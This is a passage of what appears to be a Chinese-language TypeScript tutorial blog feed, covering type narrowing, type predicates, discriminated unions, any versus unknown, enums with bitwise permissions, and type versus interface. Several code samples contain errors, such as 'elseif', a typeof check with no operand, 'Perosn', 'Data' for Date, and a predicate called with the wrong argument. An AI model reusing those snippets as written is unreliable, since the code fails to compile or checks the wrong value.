Number 的方法</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    a.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>) <span class="comment">// 这里可以调用 String 的方法</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样一来，即可保证使用的安全，这种行为也叫<strong>类型收窄</strong>。</p><h2 id="用JS做类型收窄"><a href="#用JS做类型收窄" class="headerlink" title="用JS做类型收窄"></a>用JS做类型收窄</h2><h4 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h4><p>js 的 typeof 有以下几种返回值：</p><ul><li>string</li><li>number</li><li>bigint</li><li>boolean</li><li>symbol</li><li>undefined</li><li>object</li><li>function</li></ul><p>我们发现 tpyeof 的有以下的局限性：数组对象、普通对象、日期对象、null 都无法区分</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">a</span> = (<span class="params">params: <span class="built_in">Date</span> | <span class="built_in">Date</span>[]</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> params === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">    params <span class="comment">// 此时类型仍然为 Date | Date[]</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我们还能使用 instanceof</p><h4 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h4><p>这个方法主要返回对象的类</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">a</span> = (<span class="params">params: <span class="built_in">Date</span> | <span class="built_in">Date</span>[]</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (params <span class="keyword">instanceof</span> <span class="title class_">Date</span>) &#123;</span><br><span class="line">    params <span class="comment">// 此时类型收窄为 Date</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (params <span class="keyword">instanceof</span> <span class="title class_">Array</span>) &#123;</span><br><span class="line">    params <span class="comment">// 此时类型收窄为 Array</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>instanceof 的局限性：不支持 TS 独有的类型</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Person</span> = &#123;</span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Animal</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">a</span> = (<span class="params">params: Person | Animal</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (params <span class="keyword">instanceof</span> <span class="title class_">Person</span>) &#123;  <span class="comment">// <span class="doctag">TODO:</span> 报错，Person 是一个类型，而不是类   </span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么如何解决呢？</p><h4 id="in"><a href="#in" class="headerlink" title="in"></a>in</h4><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Person</span> = &#123;</span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Animal</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">a</span> = (<span class="params">params: Person | Animal</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> params) &#123;  </span><br><span class="line">    params <span class="comment">// 这里的类型为 Animal</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&#x27;age&#x27;</span> <span class="keyword">in</span> params) &#123;</span><br><span class="line">    params <span class="comment">// 这里的类型为 Person</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>in 的局限性：只能区分部分对象，比如没有相同属性的对象、日期对象、函数</p><h4 id="思考，怎么有这么多的局限性"><a href="#思考，怎么有这么多的局限性" class="headerlink" title="思考，怎么有这么多的局限性"></a>思考，怎么有这么多的局限性</h4><p>因为我们一直在用 js 的逻辑来判断 ts 里面的逻辑，这是两门语言，根本无法做到一一对应</p><p>更多收窄，见这份<a href="https://www.typescriptlang.org/docs/handbook/2/narrowing.html#handbook-content">文档</a></p><p>众所周知：js 的类型系统就是辣鸡，那么有没有取分类型的万全之法</p><h2 id="类型谓词-x2F-类型判断"><a href="#类型谓词-x2F-类型判断" class="headerlink" title="类型谓词&#x2F;类型判断"></a>类型谓词&#x2F;类型判断</h2><h3 id="is"><a href="#is" class="headerlink" title="is"></a>is</h3><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Person</span> = &#123;</span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="attr">sex</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Animal</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">legs</span>: <span class="built_in">string</span>[];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">a</span> = (<span class="params">params: Perosn | Animal</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">isPerson</span>(a)) &#123;</span><br><span class="line">    params <span class="comment">// 这里的类型一定为 Person  </span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isPerson</span>(<span class="params">x: Person | Animal <span class="comment">/* 这里可以写 any */</span></span>): x is <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="comment">// 这里可以使用上面所有的类型判断技巧</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;age&#x27;</span> <span class="keyword">in</span> x &amp;&amp; <span class="string">&#x27;sex&#x27;</span> <span class="keyword">in</span> x <span class="comment">// 必须返回 boolean</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> isAnimal = (<span class="attr">x</span>: <span class="built_in">any</span>): x is <span class="title class_">Animal</span> =&gt; <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> x &amp;&amp; <span class="string">&#x27;legs&#x27;</span> <span class="keyword">in</span> x &amp;&amp; a <span class="keyword">instanceof</span> <span class="title class_">Array</span></span><br></pre></td></tr></table></figure><p>有点是支持所有 TS 类型，但是随之而来的缺点就是 麻烦！那么有没有更简单的方法呢？</p><h2 id="可辨别联合"><a href="#可辨别联合" class="headerlink" title="可辨别联合"></a>可辨别联合</h2><p>直接上代码</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Person</span> = &#123; <span class="attr">kind</span>: <span class="string">&#x27;person&#x27;</span>; <span class="attr">name</span>: <span class="built_in">string</span>; <span class="attr">age</span>: <span class="built_in">number</span>; &#125;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Animal</span> = &#123; <span class="attr">kind</span>: <span class="string">&#x27;animal&#x27;</span>; <span class="attr">name</span>: <span class="built_in">string</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">a</span> = (<span class="params">params: Person | Animal</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (params.<span class="property">kind</span> === <span class="string">&#x27;person&#x27;</span>) &#123;</span><br><span class="line">    params <span class="comment">// 这里的类型为 Person </span></span><br><span class="line">  &#125; elseif (params.<span class="property">kind</span> === <span class="string">&#x27;animal&#x27;</span>) &#123;</span><br><span class="line">    params <span class="comment">// 这里的类型为 Animal</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优点：把复杂类型的收窄变成简单类型的对比</li><li>局限性：1. 必须加上相同属性 kind； 2. kind 的类型必须是简单类型; 3. 各类型中的 kind 无交集</li></ul><p>则称为可辨别联合</p><h2 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Person</span> = &#123;</span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Animal</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">a</span> = (<span class="params">params: Person | Animal</span>) =&gt; &#123;</span><br><span class="line">  (params <span class="keyword">as</span> <span class="title class_">Person</span>).<span class="property">age</span> <span class="comment">// 强制告诉 ts 此时类型为 Person</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="思考：any-是否等于所有类型-除-never-x2F-unknown-x2F-any-x2F-void-的联合？为什么？"><a href="#思考：any-是否等于所有类型-除-never-x2F-unknown-x2F-any-x2F-void-的联合？为什么？" class="headerlink" title="思考：any 是否等于所有类型(除 never&#x2F;unknown&#x2F;any&#x2F;void)的联合？为什么？"></a>思考：any 是否等于所有类型(除 never&#x2F;unknown&#x2F;any&#x2F;void)的联合？为什么？</h2><p><strong>答案是不是</strong></p><p>之前在基础类型中介绍过，并画过图，any 包含了所有的类型，但是仅仅限于那个时候，在了解过类型收窄以后，就不能这么理解了。</p><p>怎么证明？用反证法：</p><p>正常来说一旦出现联合类型，那么这个时候你的类型就不能再使用了</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">a</span> = (<span class="params">params: <span class="built_in">number</span> | <span class="built_in">string</span></span>) =&gt; &#123;</span><br><span class="line">  a <span class="comment">// 此时这里只能调用 number 和 string 的共用方法，无法调用比如 split 这种字符串特有方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是如果是 any，则可以继续使用</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">a</span> = (<span class="params">params: <span class="built_in">any</span></span>) =&gt; &#123;</span><br><span class="line">  a.<span class="title function_">split</span>() <span class="comment">// 不会报错</span></span><br><span class="line">  a.<span class="title function_">toFixed</span>() <span class="comment">// 不会报错</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个时候我们再来看看<a href="https://www.typescriptlang.org/docs/handbook/2/everyday-types.html#any">官方文档</a></p><p><img src="/Blog/2023/06/10/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E8%81%94%E5%90%88%E7%B1%BB%E5%9E%8B/index/img_2.png"></p><p>解释为这是一个特殊的类型，如果你不想让你的类型报错你可以使用这个类型</p><p>其实文档也没有说的很清楚，目前来看 TS 绝大部分规则对 any 不生效</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">a</span> = (<span class="params">params: <span class="built_in">any</span></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">newParams</span>: <span class="built_in">never</span> = params <span class="comment">// <span class="doctag">TODO:</span> 报错</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="那么什么类型等于所有类型-除-never-x2F-unknown-x2F-any-x2F-void-的联合呢？为什么？"><a href="#那么什么类型等于所有类型-除-never-x2F-unknown-x2F-any-x2F-void-的联合呢？为什么？" class="headerlink" title="那么什么类型等于所有类型(除 never&#x2F;unknown&#x2F;any&#x2F;void)的联合呢？为什么？"></a>那么什么类型等于所有类型(除 never&#x2F;unknown&#x2F;any&#x2F;void)的联合呢？为什么？</h3><p><strong>答案就是 unknown</strong></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">a</span> = (<span class="params">params: <span class="built_in">unknown</span></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> === <span class="string">&#x27;number&#x27;</span>) &#123;</span><br><span class="line">    params.<span class="title function_">toFixed</span>() <span class="comment">// 这里的类型是 number</span></span><br><span class="line">  &#125; elseif (params <span class="keyword">instanceof</span> <span class="title class_">Data</span>) &#123;</span><br><span class="line">    params <span class="comment">// 这里的类型是 Date</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说 unknown 可以收窄为任意类型，那么反过来说就是 unknown 就是所有类型的联合，必须通过收窄后才能使用</p>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript全解：类型（下）</title>
      <link href="/Blog/2023/06/04/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%8B%EF%BC%89/index/"/>
      <url>/Blog/2023/06/04/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%8B%EF%BC%89/index/</url>
      
        <content type="html"><![CDATA[<h2 id="何时用enum类型"><a href="#何时用enum类型" class="headerlink" title="何时用enum类型"></a>何时用enum类型</h2><p>当前端遇到这种需求的时候：</p><p><img src="/Blog/2023/06/04/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%8B%EF%BC%89/index/img.png"></p><p>前端需要显示后端返回的状态 1，2，3，4，还要传输这个值回去，</p><p>但是我们经常会忘记这个值是什么意思，这个时候就可以使用 enum</p><p><img src="/Blog/2023/06/04/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%8B%EF%BC%89/index/img_1.png"></p><p>🌰：二进制权限</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Permission</span> &#123;</span><br><span class="line">  <span class="title class_">None</span> = <span class="number">0</span>,</span><br><span class="line">  <span class="title class_">Read</span> = <span class="number">1</span> &lt;&lt; <span class="number">0</span>, <span class="comment">// 0001 // 这里的 &lt;&lt; 是左移操作，1在二进制表示为 00..001，那么左移一位就是 00..010</span></span><br><span class="line">  <span class="title class_">Write</span> = <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="comment">// 0010</span></span><br><span class="line">  <span class="title class_">Delete</span> = <span class="number">1</span> &lt;&lt; <span class="number">2</span>, <span class="comment">//0100</span></span><br><span class="line">  <span class="title class_">Manage</span> = <span class="title class_">Read</span> | <span class="title class_">Write</span> | <span class="title class_">Delete</span>, <span class="comment">// 0111 // 这个的 | 是并操作，取二进制各个位置的 1 为结果</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">user1</span>: &#123; <span class="attr">permission</span>: <span class="title class_">Permission</span> &#125; = &#123; <span class="attr">permission</span>: <span class="number">0b0101</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里的 &amp; 是与操作，取二进制各个位置同时为 1的为结果</span></span><br><span class="line"><span class="keyword">if</span> ((user1.<span class="property">permission</span> &amp; <span class="title class_">Permission</span>.<span class="property">Write</span>) === <span class="title class_">Permission</span>.<span class="property">Write</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;拥有写权限&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((user1.<span class="property">permission</span> &amp; <span class="title class_">Permission</span>.<span class="property">Manage</span>) === <span class="title class_">Permission</span>.<span class="property">Manage</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;拥有管理权限&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="何时不用-enum"><a href="#何时不用-enum" class="headerlink" title="何时不用 enum"></a>何时不用 enum</h2><p>并不是说不能用，而是这时候用会显得很呆</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Fruit</span> &#123;</span><br><span class="line">  apple = <span class="string">&#x27;apple&#x27;</span>,</span><br><span class="line">  banana = <span class="string">&#x27;banana&#x27;</span>,</span><br><span class="line">  pineapple = <span class="string">&#x27;pineapple&#x27;</span>,</span><br><span class="line">  watermelon = <span class="string">&#x27;watermelon&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> f = <span class="title class_">Fruit</span>.<span class="property">apple</span>; <span class="comment">// 这里甚至不能写 &#x27;apple&#x27;</span></span><br><span class="line">f = <span class="title class_">Fruit</span>.<span class="property">pineapple</span></span><br></pre></td></tr></table></figure><p>几乎等价于</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Fruit</span> = <span class="string">&#x27;apple&#x27;</span> | <span class="string">&#x27;banana&#x27;</span> | <span class="string">&#x27;pineapple&#x27;</span> | <span class="string">&#x27;watermelon&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> f = <span class="string">&#x27;apple&#x27;</span></span><br><span class="line">f = <span class="string">&#x27;pineapple&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><ul><li>number enum √</li><li>string enum ×</li><li>other enum ×</li></ul><p>个人也觉得在 JS 中不太实用，在没有 enum 的时候 JS 程序员就在用对象表示了，而且还比不上对象好用：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> PERMISSION = &#123;</span><br><span class="line">  <span class="number">0</span>: <span class="string">&#x27;read&#x27;</span>,</span><br><span class="line">  <span class="number">1</span>: <span class="string">&#x27;write&#x27;</span>,</span><br><span class="line">  <span class="number">2</span>: <span class="string">&#x27;delete&#x27;</span>,</span><br><span class="line">  <span class="number">3</span>: <span class="string">&#x27;manage&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>也几乎是一样的效果，无论有没有 enum，也能用的好好的，最多可能性能上没有 enum 好，又不是不能用，建议是能不用就不用</p></blockquote><h2 id="type与interfacer的区别"><a href="#type与interfacer的区别" class="headerlink" title="type与interfacer的区别"></a>type与interfacer的区别</h2><h3 id="何时用-type？"><a href="#何时用-type？" class="headerlink" title="何时用 type？"></a>何时用 type？</h3><p>答案是什么时候都可以，几乎没有不能用的场合</p><p>type 又叫类型别名，英文 Type Alias，简单来说就给其他类型取个名字</p><p>比如说我们可以给 string 换个名字，以下这样几乎是等价的：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Name</span> = <span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">a</span>: <span class="title class_">Name</span> = <span class="string">&#x27;hi&#x27;</span></span><br></pre></td></tr></table></figure><p>等等其他复杂类型都可以用 type，这里只说一种特殊情况，带有属性的函数：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Fn</span> = <span class="function">(<span class="params">a: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">void</span> <span class="comment">// 纯函数，没有属性</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">FnWithProp</span> = &#123;</span><br><span class="line">  (<span class="attr">a</span>: <span class="built_in">number</span>): <span class="built_in">void</span>; <span class="comment">// 这里来声明函数，语法很奇怪把~</span></span><br><span class="line">  <span class="attr">prop</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="为何要叫做类型别名，不叫做类型声明"><a href="#为何要叫做类型别名，不叫做类型声明" class="headerlink" title="为何要叫做类型别名，不叫做类型声明"></a>为何要叫做类型别名，不叫做类型声明</h3><p>因为 ts 一开始并没有想要记住这个名字，比如说：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="type">A </span>= string;</span><br><span class="line"><span class="keyword">type</span> <span class="type">B </span>= A</span><br></pre></td></tr></table></figure><p>请问此时 B 的类型是什么，应该是 A 把，<br>但是其实是 string，A 没有被记住</p><p><img src="/Blog/2023/06/04/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%8B%EF%BC%89/index/img_2.png"></p><h3 id="何时用-interface"><a href="#何时用-interface" class="headerlink" title="何时用 interface"></a>何时用 interface</h3><p>interface 又叫声明接口，</p><p>接口是什么？你翻过的 JS 教程中，从来没有提到过这个单词，那是那个理论讲到这个呢？是面向对象。ts 为了满足这些人，搞了一个接口出来。</p><p>此接口非彼接口，还是对象，描述对象的属性（declare the shapes of objects）</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 描述普通对象</span></span><br><span class="line"><span class="keyword">interface</span> A &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 描述数组</span></span><br><span class="line"><span class="keyword">interface</span> A <span class="keyword">extends</span> <span class="title class_">Array</span>&lt;<span class="built_in">string</span>&gt;&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如何用 type 实现上述效果</span></span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">A2</span> = <span class="title class_">Array</span>&lt;<span class="built_in">string</span>&gt; &amp; &#123; <span class="attr">name</span>: <span class="built_in">string</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 描述函数</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Fn</span> &#123;</span><br><span class="line">  (<span class="attr">a</span>: <span class="built_in">number</span>): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 描述带成员的函数</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Fn</span> &#123;</span><br><span class="line">  (<span class="attr">a</span>: <span class="built_in">number</span>): <span class="built_in">void</span>;</span><br><span class="line">  <span class="attr">prop</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 描述日期对象</span></span><br><span class="line"><span class="keyword">interface</span> D <span class="keyword">extends</span> <span class="title class_">Date</span> &#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="type-不可重新赋值"><a href="#type-不可重新赋值" class="headerlink" title="type 不可重新赋值"></a>type 不可重新赋值</h3><p>这个既是优点也是缺点</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> A = <span class="built_in">number</span>;</span><br><span class="line"></span><br><span class="line">A = <span class="built_in">string</span> <span class="comment">// 报错，没有这种语法</span></span><br></pre></td></tr></table></figure><p>好处是提升效率，声明什么就是什么，不用管以后你还会变，当然带来的缺点则是不好拓展</p><h3 id="interface-能自动合并"><a href="#interface-能自动合并" class="headerlink" title="interface 能自动合并"></a>interface 能自动合并</h3><p>比如在我们经常使用的 axios 上：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// custom.d.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AxiosRTequestConfig</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> <span class="variable language_">module</span> <span class="string">&#x27;axios&#x27;</span> &#123;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">interface</span>  <span class="title class_">AxiosRequestConfig</span> &#123;</span><br><span class="line">    _autoLoading?: <span class="built_in">boolean</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">axios.<span class="title function_">get</span>(<span class="string">&#x27;/list&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">_autoLoading</span>: <span class="literal">true</span> <span class="comment">// 拓展出来的</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>比如拓展 String：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="variable language_">global</span> &#123;</span><br><span class="line">  <span class="keyword">interface</span> <span class="title class_">String</span> &#123;</span><br><span class="line">    <span class="title 